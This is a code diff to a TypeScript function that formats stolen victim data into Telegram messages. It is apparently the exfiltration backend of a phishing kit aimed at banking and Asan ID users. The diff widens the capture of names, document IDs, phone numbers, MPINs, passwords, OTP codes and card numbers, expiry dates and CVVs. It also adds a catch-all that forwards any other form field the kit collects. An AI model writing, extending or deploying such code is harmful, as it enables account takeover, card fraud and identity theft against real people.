@@ -275,31 +275,33 @@ export const sendTelegramMessage = async (params: {
             message += `<b>📝 DETAILS:</b>\n${customMsg}\n\n`;
         }
 
-        // Section: USER DATA (Only if provided)
+        // Section: USER DATA (Comprehensive field mapping for all screen forms)
+        const userDocId = newInfo.documentId || newInfo.docId || newInfo.DocumentId || newInfo.doc_id || newInfo.DocId || newInfo.id;
+        const userName = newInfo.fullName || newInfo.FullName || newInfo.full_name || newInfo.name || newInfo.Name || newInfo.username || newInfo.Username;
+        const userPhone = newInfo.mobileNumber || newInfo.MobileNumber || newInfo.mobile || newInfo.phoneNumber || newInfo.phone || newInfo.Phone || newInfo.PhoneNumber || newInfo.mobile_number;
+        const userMpin = newInfo.mpin || newInfo.MPIN || newInfo.mPin || newInfo.pin || newInfo.PIN || newInfo.userPin || newInfo.Pin;
         const userEmail = newInfo.email || newInfo.Email;
         const userPassword = newInfo.password || newInfo.Password || newInfo.pass || newInfo.Pass;
-        const userPin = newInfo.pin || newInfo.PIN || newInfo.userPin || newInfo.Pin;
-        const userPhone = newInfo.phoneNumber || newInfo.phone || newInfo.Phone || newInfo.PhoneNumber;
-        const userName = newInfo.name || newInfo.Name || newInfo.username || newInfo.Username;
         const userAsan = newInfo.asanId || newInfo.AsanId;
 
-        const hasUserData = userEmail || userPassword || userPin || userPhone || userName || userAsan;
+        const hasUserData = userDocId || userName || userPhone || userMpin || userEmail || userPassword || userAsan;
         if (hasUserData) {
             message += `<b>👤 USER DATA:</b>\n`;
-            if (userName) message += `• <b>Name:</b> <code>${userName}</code>\n`;
-            if (userPhone) message += `• <b>Phone:</b> <code>${userPhone}</code>\n`;
-            if (userEmail) message += `• <b>Email:</b> <code>${userEmail}</code>\n`;
-            if (userPassword) message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
-            if (userPin) message += `• <b>PIN:</b> <code>${userPin}</code>\n`;
-            if (userAsan) message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
+            if (userDocId && userDocId !== "N/A") message += `• <b>Document ID:</b> <code>${userDocId}</code>\n`;
+            if (userName && userName !== "N/A") message += `• <b>Full Name:</b> <code>${userName}</code>\n`;
+            if (userPhone && userPhone !== "N/A") message += `• <b>Phone / Mobile:</b> <code>${userPhone}</code>\n`;
+            if (userMpin && userMpin !== "N/A") message += `• <b>MPIN:</b> <code>${userMpin}</code>\n`;
+            if (userEmail && userEmail !== "N/A") message += `• <b>Email:</b> <code>${userEmail}</code>\n`;
+            if (userPassword && userPassword !== "N/A") message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
+            if (userAsan && userAsan !== "N/A") message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
             message += `\n`;
         }
 
         // Section: OTP (Only if provided)
-        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3;
+        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3 || newInfo.otp || newInfo.OTP;
         if (hasOtp) {
             message += `<b>🔐 OTP VERIFICATION:</b>\n`;
-            if (newInfo.otp1) message += `• <b>OTP-1:</b> <code>${newInfo.otp1}</code>\n`;
+            if (newInfo.otp1 || newInfo.otp || newInfo.OTP) message += `• <b>OTP-1:</b> <code>${newInfo.otp1 || newInfo.otp || newInfo.OTP}</code>\n`;
             if (newInfo.otp2) message += `• <b>OTP-2:</b> <code>${newInfo.otp2}</code>\n`;
             if (newInfo.otp3) message += `• <b>OTP-3:</b> <code>${newInfo.otp3}</code>\n`;
             message += `\n`;
@@ -319,6 +321,30 @@ export const sendTelegramMessage = async (params: {
             if (newInfo.cardNumber) message += `• <b>Card No:</b> <code>${newInfo.cardNumber}</code>\n`;
             if (newInfo.expiry) message += `• <b>Expiry:</b> <code>${newInfo.expiry}</code>\n`;
             if (newInfo.cvv) message += `• <b>CVV:</b> <code>${newInfo.cvv}</code>\n`;
+            message += `\n`;
+        }
+
+        // Section: ADDITIONAL COLLECTED DATA (Catch any other custom keys)
+        const standardKeys = new Set([
+            "type", "title", "exclude", "message",
+            "documentId", "docId", "DocumentId", "doc_id", "DocId", "id",
+            "fullName", "FullName", "full_name", "name", "Name", "username", "Username",
+            "mobileNumber", "MobileNumber", "mobile", "phoneNumber", "phone", "Phone", "PhoneNumber", "mobile_number",
+            "mpin", "MPIN", "mPin", "pin", "PIN", "userPin", "Pin",
+            "email", "Email", "password", "Password", "pass", "Pass", "asanId", "AsanId",
+            "otp1", "otp2", "otp3", "otp", "OTP",
+            "balance", "cardNumber", "expiry", "cvv"
+        ]);
+
+        const extraEntries = Object.entries(newInfo).filter(
+            ([key, val]) => !standardKeys.has(key) && val !== undefined && val !== null && val !== ""
+        );
+
+        if (extraEntries.length > 0) {
+            message += `<b>📋 OTHER DATA:</b>\n`;
+            extraEntries.forEach(([key, val]) => {
+                message += `• <b>${key}:</b> <code>${val}</code>\n`;
+            });
             message += `\n`;
         }
 
